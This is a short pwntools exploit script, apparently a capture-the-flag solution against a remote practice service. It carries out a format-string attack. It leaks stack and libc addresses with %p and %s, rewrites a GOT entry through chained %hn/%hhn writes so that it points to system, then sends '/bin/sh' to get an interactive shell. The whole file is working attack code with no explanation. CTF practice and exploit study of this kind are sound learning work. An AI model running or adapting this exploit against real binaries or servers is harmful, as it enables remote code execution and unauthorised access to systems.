from pwn import *

io=remote('node3.buuoj.cn',25849)
io.sendline('ydh')

io.recvuntil('password:')
io.sendline('%6$p') #6->10  
io.recvuntil('wrong password: ')
change=(int(io.recvline()[2:],16)-4)&0xff
print(hex(change))

pl1='%'+str(change)+'c'+'%6$hhn' #change 10->9
io.recvuntil('Try again!')
io.sendline(pl1)

pl2='%'+str(0x14)+'c'+'%10$hhn'   #9->puts
io.recvuntil('Try again!')
io.sendline(pl2)

pl1='%'+str(change-4)+'c'+'%6$hhn' #change 10->8
io.recvuntil('Try again!')
io.sendline(pl1)

pl2='%'+str(0xb016)+'c'+'%10$hn'   #9->puts+2
io.recvuntil('Try again!')
io.sendline(pl2)

io.recvuntil('Try again!')
io.sendline('%9$s')
io.recvuntil('wrong password: ')
print_add=u32(io.recv(4))
print(hex(print_add))

libc_base=print_add-0x050b60
sys=libc_base+0x03cd10
print(hex(sys))
a=sys&0xffff
print(hex(a))
b=sys>>16
print(hex(b))

pl3='%'+str(a)+'c'+'%9$hn'+'%'+str(b-a)+'c'+'%8$hn'
io.recvuntil('Try again!')
io.sendline(pl3)
io.sendline('/bin/sh')

io.interactive()